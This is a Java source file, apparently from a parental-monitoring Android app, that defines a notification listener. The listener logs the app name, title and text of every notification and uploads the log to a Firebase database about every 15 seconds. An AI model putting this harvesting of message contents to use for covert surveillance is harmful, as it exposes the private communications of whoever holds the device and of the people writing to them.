package com.kidsguard.child;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.text.TextUtils;

public class NotifListener extends NotificationListenerService {

    private static StringBuilder notifLog = new StringBuilder();
    private static long lastUpload = 0;

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;
        String pkg = sbn.getPackageName();
        CharSequence title = "";
        CharSequence text = "";
        if (sbn.getNotification() != null && sbn.getNotification().extras != null) {
            title = sbn.getNotification().extras.getCharSequence("android.title");
            text = sbn.getNotification().extras.getCharSequence("android.text");
        }

        String entry = pkg + " | " +
                (title != null ? title.toString() : "") + " | " +
                (text != null ? text.toString() : "") + "\n";
        notifLog.append(entry);

        if (notifLog.length() > 8000) {
            notifLog.delete(0, notifLog.length() - 6000);
        }

        long now = System.currentTimeMillis();
        if (now - lastUpload > 15000) {
            lastUpload = now;
            String devId = LocationService.getSafeDeviceId(this);
            FirebaseHelper.put("devices/" + devId + "/notifications.json",
                    "{\"data\":\"" + FirebaseHelper.escapeJson(notifLog.toString()) + "\"}");
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn) {}
}
